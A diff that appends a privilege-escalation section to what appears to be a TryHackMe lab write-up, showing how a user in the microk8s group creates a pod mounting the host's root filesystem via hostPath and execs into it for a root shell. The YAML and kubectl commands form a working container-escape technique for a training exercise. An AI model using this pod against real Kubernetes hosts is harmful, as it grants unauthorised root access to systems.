@@ -393,5 +393,89 @@ Decoding the above credentials above I tried to login via SSH using the Frank ac
 
 ![image](https://github.com/F41zK4r1m/TryHackMe/assets/87700008/121711c7-a864-47ae-b551-b9e64d6dee84)
 
+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+## Privilege escalation:
+
+To get the root flag I should have to obtain the root access & to obtain the root privileges I have to escalate my current privileges. 
+So, I started my enumeration with checking the sudo privileges but Frank is not having any suod privileges assigned:
+
+![image](https://github.com/F41zK4r1m/TryHackMe/assets/87700008/d2059fa1-2734-491c-b47a-f156ccb2d2c4)
+
+Moving further I checked any scheduled tasks running in the host but there isn't anything running:
+
+![image](https://github.com/F41zK4r1m/TryHackMe/assets/87700008/4b0c3bb5-62de-46d8-a6d3-09db0417c80a)
+
+I didn't executed the linpeas as the root is mostly fall into kubernetes & followed the hint from the THM page:
+
+![image](https://github.com/F41zK4r1m/TryHackMe/assets/87700008/de600f14-2dbe-4e4a-b1f7-150d01b4ce5b)
+
+Using this hint I used a tool called "[kube-hunter](https://github.com/aquasecurity/kube-hunter)" which can scan the target remotely. Leveraging this tool I scanned the target host:
+
+![image](https://github.com/F41zK4r1m/TryHackMe/assets/87700008/be2daac3-5eb5-4668-9f14-196a85c66efa)
+![image](https://github.com/F41zK4r1m/TryHackMe/assets/87700008/ecc32e80-ed24-42f0-a918-6160577adb04)
+
+Now, Since I have confirmed that I can escalate my privileges using on the the vulnerable container & also Frank is in the microk8s group.
+
+I searched for microK8s privilege escalation & found this blog by [PulseSecurity](https://pulsesecurity.co.nz/advisories/microk8s-privilege-escalation) & also started checking for the microk8s:
+
+![image](https://github.com/F41zK4r1m/TryHackMe/assets/87700008/f4534f2d-dd90-4f31-b21a-83251bafe2f4)
+
+![image](https://github.com/F41zK4r1m/TryHackMe/assets/87700008/faf154b5-cc96-407e-a15b-4f4d13a85871)
+
+I observed a pod kubectl, for which I checked the details further & found nginx-deployement pod is running inside it:
+
+![image](https://github.com/F41zK4r1m/TryHackMe/assets/87700008/eb1cbcd8-f090-4251-83cf-f40abe68ba14)
+
+Again I checked the pod details using below command & found these details which revealed the image & image ID:
+
+```bash
+microk8s.kubectl get pods nginx-deployment-7b548976fd-77v4r -o yaml
+```
+
+![image](https://github.com/F41zK4r1m/TryHackMe/assets/87700008/0e1d1ef7-afe7-49a5-a883-5b78a021331d)
+![image](https://github.com/F41zK4r1m/TryHackMe/assets/87700008/c17c6b6c-b09a-413b-b370-4c635c5b736d)
+
+Now, as I have the image name & ID I create my malicious pod accroding to the POC & get the root shell. The yaml file for the pod creation is looking like this after changing the pod name:
+
+```yaml
+apiVersion: v1                                                                                                                                                                                                                             
+kind: Pod                                                                                                                                                                                                                                  
+metadata:                                                                                                                                                                                                                                  
+  name: hostmount                                                                                                                                                                                                                          
+spec:                                                                                                                                                                                                                                      
+  containers:                                                                                                                                                                                                                              
+  - name: shell                                                                                                                                                                                                                            
+    image: localhost:32000/bsnginx                                                                                                                                                                                                         
+    command:                                                                                                                                                                                                                               
+      - "bin/bash"                                                                                                                                                                                                                         
+      - "-c"                                                                                                                                                                                                                               
+      - "sleep 10000"                                                                                                                                                                                                                      
+    volumeMounts:                                                                                                                                                                                                                          
+      - name: root                                                                                                                                                                                                                         
+        mountPath: /opt/root                                                                                                                                                                                                               
+  volumes:                                                                                                                                                                                                                                 
+  - name: root                                                                                                                                                                                                                             
+    hostPath:                                                                                                                                                                                                                              
+      path: /                                                                                                                                                                                                                              
+      type: Directory
+```
+
+After which I pushed the yaml file for pod creation:
+
+```bash
+microk8s.kubectl apply -f pod.yaml
+```
+
+Once the pod was created I executed the bash using the hostmount commamd by following the poc:
+
+```bash
+microk8s.kubectl exec -it hostmount /bin/bash
+```
+![image](https://github.com/F41zK4r1m/TryHackMe/assets/87700008/812d8d08-42e0-4f91-8c4a-c832e23476ae)
+
+Once the execution was successfull I finally got the root shell & also mounted the root folder in '/opt/root' path, due to which I was finally able to extract the root flag.(pwn3d! 🙂)
+
+![image](https://github.com/F41zK4r1m/TryHackMe/assets/87700008/d68d47d3-0798-467f-8db1-3626aee49f8f)
 
 
